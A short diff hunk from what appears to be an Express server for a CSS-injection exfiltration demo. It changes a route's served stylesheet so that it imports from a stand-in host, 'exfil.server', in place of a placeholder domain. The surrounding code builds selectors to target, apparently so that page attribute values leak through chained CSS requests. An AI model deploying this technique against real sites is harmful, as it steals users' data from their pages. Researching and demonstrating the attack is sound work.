@@ -337,7 +337,7 @@ app.get('/:wildcard/css.css', (req, res) => {
 	console.log(minSelectorToTarget);
 	genSelectorArray();
 	res.setHeader('Content-Type', 'text/css');
-	res.send("@import 'https://any.com/start'");
+	res.send("@import 'https://exfil.server/start'");
 });
 
 //Makes it possible to view the demo site at /index.html
